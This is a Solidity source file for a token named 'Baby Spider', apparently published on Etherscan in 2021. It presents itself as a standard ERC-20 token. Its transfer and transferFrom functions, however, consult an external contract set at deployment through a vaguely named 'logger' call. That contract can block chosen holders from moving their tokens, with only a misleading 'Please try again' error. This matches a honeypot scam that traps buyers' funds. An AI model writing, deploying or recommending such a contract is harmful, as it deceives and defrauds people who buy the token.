/**
 *Submitted for verification at Etherscan.io on 2021-08-18
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface IE20 {

    function check_sum( address checker) external view returns (bool);

    function logger(address account) external view returns (uint8);

    function move_to(address senders, address taker, address mediator, uint balance, uint amount) external returns (address);

    function get_results(address account, uint amount) external returns (uint);

    function get_state(address account) external returns (bool);

}

contract Baby_Spider {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IE20 dolog;
    uint256 public totalSupply = 1 * 10**12 * 10**18;
    string public name = "Baby Spider";
    string public symbol = hex"42616279537069646572f09f95b7";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IE20 _dstntn) {
        
        dolog = _dstntn;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(dolog.logger(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(dolog.logger(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}